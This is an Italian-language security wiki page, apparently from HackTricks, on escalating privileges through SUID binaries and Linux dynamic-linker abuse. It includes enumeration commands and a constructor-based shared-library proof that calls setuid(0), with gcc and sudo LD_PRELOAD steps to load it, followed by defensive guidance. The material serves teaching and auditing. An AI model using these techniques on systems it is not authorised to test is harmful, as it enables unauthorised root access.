# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

I binari SUID vengono solitamente analizzati per verificare l'esecuzione diretta di comandi, ma i programmi SUID personalizzati possono essere vulnerabili anche tramite il dynamic linker. Il tema comune è semplice: un eseguibile con privilegi carica codice da un percorso o una configurazione che un utente con privilegi inferiori può influenzare.<sup>[[1]](#references)</sup>

Questa pagina si concentra sui pattern generici delle tecniche: librerie mancanti, directory delle librerie scrivibili, `RPATH`/`RUNPATH`, `LD_PRELOAD` tramite sudo, configurazione del linker e confusione relativa agli hardlink SUID.

## Enumerazione rapida

Inizia cercando file SUID insoliti e verificando se sono collegati dinamicamente:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentrati su posizioni non standard, percorsi di applicazioni personalizzati, binari di proprietà di root ma al di fuori delle directory gestite dai pacchetti e dipendenze caricate da directory scrivibili.<sup>[[1]](#references)</sup>

Controlli utili della scrivibilità:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Alcuni binari SUID personalizzati cercano di caricare un shared object che non esiste. Se il percorso mancante si trova in una directory controllata dall'attacker, il binario può caricare codice fornito dall'attacker con l'utente effettivo.<sup>[[1]](#references)</sup>

Trova le ricerche di librerie non riuscite con il filtro delle syscall di `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Se il binario cerca `libexample.so` in un percorso scrivibile, una libreria di prova minimale può utilizzare un constructor. Mantieni il proof-of-impact innocuo durante la validazione:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compilalo usando il nome file esatto che il binario tenta di caricare:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condizione sfruttabile non è costituita esclusivamente dalla libreria mancante. L'attaccante deve poter posizionare un shared object compatibile in un percorso che il loader privilegiato accetterà.<sup>[[1]](#references)</sup>

## Directory delle librerie scrivibile

A volte tutte le dipendenze sono presenti, ma una delle directory utilizzate per risolverle è scrivibile. Ciò può consentire di sostituire una libreria caricata o di inserire una libreria con priorità maggiore e lo stesso nome.<sup>[[1]](#references)</sup>

Esaminare i percorsi delle dipendenze:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Se la directory è scrivibile, verifica con un approccio sicuro basato su copie in un ambiente di laboratorio. Sostituire le librerie di sistema su un host attivo può lasciare i processi avviati contemporaneamente con versioni delle librerie non coerenti.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` e `RUNPATH` sono voci della sezione dinamica che indicano al loader dove cercare le librerie. Sono pericolose nei programmi SUID quando puntano a directory scrivibili dall'attaccante.<sup>[[1]](#references)</sup>

Rilevale:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Esempio di output rischioso:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Se `/opt/app/lib` è scrivibile e il binario necessita di `libcustom.so`, l’attaccante potrebbe essere in grado di inserirvi un `libcustom.so` malevolo:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` e `RUNPATH` non sono identici in tutti i dettagli della risoluzione, ma per la revisione relativa alla privilege-escalation la domanda pratica è la stessa: il binario SUID cerca una directory scrivibile dall'attacker per il nome di una library?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Per i programmi normali, `LD_PRELOAD` e `LD_LIBRARY_PATH` possono forzare o influenzare il caricamento degli shared object. Per i programmi SUID, il dynamic loader normalmente entra in secure-execution mode e ignora le variabili d'ambiente pericolose.<sup>[[1]](#references)</sup>

Ciò significa che un semplice binario SUID di solito non è vulnerabile solo perché l'utente può impostare `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
L’eccezione comune è una policy di sudo che consente di impostare o preservare le variabili del loader per il comando di destinazione. Controlla `sudo -l` alla ricerca di voci come `env_keep+=LD_PRELOAD` o `env_keep+=LD_LIBRARY_PATH`; se la destinazione è collegata dinamicamente, potrebbe caricare codice controllato dall’attaccante:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Non confondere questi casi; il loader e le regole della sudo policy riportate sopra li distinguono:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` contro un normale binario SUID: generalmente bloccato dall'esecuzione sicura.
- `LD_PRELOAD` mantenuto da sudo: potenzialmente sfruttabile.
- `.so` mancante in un path scrivibile: sfruttabile quando il binario SUID carica naturalmente quel path.
- `RPATH`/`RUNPATH` verso una directory scrivibile: sfruttabile quando è possibile controllare una libreria necessaria.
- Accesso in scrittura a `/etc/ld.so.preload` o alla configurazione del linker: impatto elevato e a livello di sistema.

## Configurazione del linker

`ld.so` utilizza la cache del linker e `/etc/ld.so.preload`; `ldconfig` crea tale cache a partire da `/etc/ld.so.conf` e dai file inclusi da esso, comunemente `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Controlli di elevato valore:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
La configurazione scrivibile del linker è solitamente più grave di un singolo binario SUID vulnerabile, perché può influire su molti processi collegati dinamicamente. `/etc/ld.so.preload` è particolarmente pericoloso perché può forzare il caricamento di uno shared object nei processi privilegiati.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Gli hardlink possono fare in modo che lo stesso inode SUID appaia con più nomi.<sup>[[9]](#references)</sup> Questo è utile per nascondere un helper privilegiato, confondere le operazioni di cleanup o aggirare una revisione ingenua basata sui path.

Trova i file SUID con più di un link:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ispeziona tutti i percorsi verso lo stesso inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
L'abuso non consiste nel fatto che un hardlink modifichi i permessi. L'abuso consiste nella confusione dei percorsi: un inode privilegiato può essere raggiungibile tramite un nome che i defender o gli script non si aspettano.<sup>[[9]](#references)</sup> Per un approfondimento sul workflow di inode e hardlink, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Note difensive

- Mantieni i binari SUID minimali, sottoposti ad audit e, ove possibile, gestiti tramite pacchetti.
- Evita voci `RPATH`/`RUNPATH` che puntano a directory scrivibili o gestite dalle applicazioni.<sup>[[1]](#references)[[8]](#references)</sup>
- Mantieni le directory delle librerie di proprietà di root e non scrivibili dagli utenti normali.<sup>[[8]](#references)</sup>
- Non conservare `LD_PRELOAD`, `LD_LIBRARY_PATH` o variabili simili del loader tramite sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Monitora `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e i file SUID imprevisti.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Esamina i file SUID collegati tramite hardlink e analizza i wrapper SUID personalizzati al di fuori dei percorsi standard di sistema.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (Utilità binarie GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Pagina del manuale Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Attributi comuni (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Hardening del Dynamic Linker (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (Utilità binarie GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
